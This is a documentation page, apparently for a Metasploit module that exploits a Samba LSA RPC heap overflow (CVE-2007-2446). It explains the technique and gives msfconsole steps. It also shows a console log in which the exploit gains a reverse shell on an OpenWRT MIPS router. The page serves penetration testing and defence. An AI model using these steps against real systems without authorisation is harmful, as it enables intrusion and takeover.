{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/samba/lsa_transnames_heap","result":{"data":{"moduleMetadataJson":{"id":"37f5044b-ecc8-5d6f-8c95-184252f8881e","name":"Samba lsa_io_trans_names Heap Overflow","fullname":"exploit/linux/samba/lsa_transnames_heap","description":"This module triggers a heap overflow in the LSA RPC service\n      of the Samba daemon. This module uses the TALLOC chunk overwrite\n      method (credit Ramon and Adriano), which only works with Samba\n      versions 3.0.21-3.0.24. Additionally, this module will not work\n      when the Samba \"log level\" parameter is higher than \"2\".","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/samba/lsa_transnames_heap","documentationSlug":"/modules/documentation/exploit/linux/samba/lsa_transnames_heap","referencesSlug":"/modules/references/exploit/linux/samba/lsa_transnames_heap"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Samba 3.0.0 through 3.0.25rc3 are vulnerable to multiple heap overflows. This module targets a heap overflow in the LsarLookupSids RPC call (CVE-2007-2446), causing an overflow in the function lsa_io_trans_name().</p>\n<p>  The exploit uses the heap overflow to overwrite a function pointer contained in the metadata of the TALLOC memory allocator, a technique which only works on Samba versions 3.0.21-3.0.24.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/linux/samba/lsa_transnames_heap</code></li>\n<li>Do: <code class=\"language-text\">show targets</code> to see the possible targets</li>\n<li>Do: <code class=\"language-text\">set target #</code></li>\n<li>Do: <code class=\"language-text\">set rhost</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n</ol>\n<h2 id=\"mips-port\" style=\"position:relative;\"><a href=\"#mips-port\" aria-label=\"mips port permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MIPS port</h2>\n<p>  This module was ported to exploit the MIPS architecture. After creating a suitable debugging environment using qemu to emulate Samba on a desktop PC the following steps were required:</p>\n<h3 id=\"mips-nop-generator\" style=\"position:relative;\"><a href=\"#mips-nop-generator\" aria-label=\"mips nop generator permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>MIPS nop generator</h3>\n<p>  The exploit uses a heap overflow to put a large nop sled in memory to decrease the accuracy needed in the initial redirection of code flow. A nop sled is a large section of contiguous instructions which do nothing. When code flow is redirected to a nop sled it will continue executing the effect-less nops. At the end of the sled the true payload is added and execution will eventually hit this code.</p>\n<p>  A nop generator module was created for MIPS by creating a stream of random instructions which create no side-effects e.g. <code class=\"language-text\">sll $2, $2, 0</code></p>\n<h3 id=\"heap-address-brute-force\" style=\"position:relative;\"><a href=\"#heap-address-brute-force\" aria-label=\"heap address brute force permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Heap address brute force</h3>\n<p>  The exploit uses a brute force approach to minimize problems with unpredictability in heap layout. The exploit itself is run multiple times, each time targeting a different point in the heap with the change of execution flow. If all goes correctly, the nop sled will be hit and code execution will follow. If the nop sled is missed, the Samba process is likely to crash, which is generally not a problem as a new instance is forked for each incoming connection. In the event of a crash, a new heap address is chosen and exploitation is attempted again.</p>\n<p>  When porting the exploit to a new system, the approximate heap layout must be known in order to suitably attempt exploitation across all of the possible heap locations. As the MIPS port targeted a specific router, the heap layout was determined by examining the ranges identified in <em>/proc/<pid>/maps</em></p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/linux/samba/lsa\\_transnames_heap\nmsf exploit(lsa\\_transnames_heap) &gt; set target 7\ntarget =&gt; 7\nmsf exploit(lsa\\_transnames_heap) &gt; set rhost 192.168.1.1\nrhost =&gt; 192.168.1.1\nmsf exploit(lsa\\_transnames_heap) &gt; show options\n\nModule options (exploit/linux/samba/lsa\\_transnames_heap):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    192.168.1.1      yes       The target address\n   RPORT    445              yes       The SMB service port\n   SMBPIPE  LSARPC           yes       The pipe name to use\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   7   Linux Heap Brute Force (OpenWRT MIPS)\n\n\nmsf exploit(lsa\\_transnames_heap) &gt; exploit\n\n[*] Started reverse TCP handler on 192.168.1.3:4444\n[*] 192.168.1.1:445 - Creating nop sled....\n[*] 192.168.1.1:445 - Trying to exploit Samba with address 0x55900000...\n[*] 192.168.1.1:445 - Connecting to the SMB service...\n[*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Calling the vulnerable function...\n[*] 192.168.1.1:445 - Server did not respond, this is expected\n[*] 192.168.1.1:445 - Trying to exploit Samba with address 0x5590f000...\n[*] 192.168.1.1:445 - Connecting to the SMB service...\n[*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Calling the vulnerable function...\n[*] 192.168.1.1:445 - Server did not respond, this is expected\n\n...Some intermediate attempts ommitted...\n\n[*] 192.168.1.1:445 - Trying to exploit Samba with address 0x55996000...\n[*] 192.168.1.1:445 - Connecting to the SMB service...\n[*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Calling the vulnerable function...\n[*] 192.168.1.1:445 - Server did not respond, this is expected\n[*] 192.168.1.1:445 - Trying to exploit Samba with address 0x559a5000...\n[*] 192.168.1.1:445 - Connecting to the SMB service...\n[*] 192.168.1.1:445 - Binding to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Bound to 12345778-1234-abcd-ef00-0123456789ab:0.0@ncacn_np:192.168.1.1[\\lsarpc] ...\n[*] 192.168.1.1:445 - Calling the vulnerable function...\n[*] Command shell session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.1:4175) at 2016-10-31 14:00:33 +0000\n\nuname -a\nLinux WNR2200 2.6.15 #1 Mon Dec 23 15:58:24 CST 2013 mips unknown</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"37f5044b-ecc8-5d6f-8c95-184252f8881e"}}}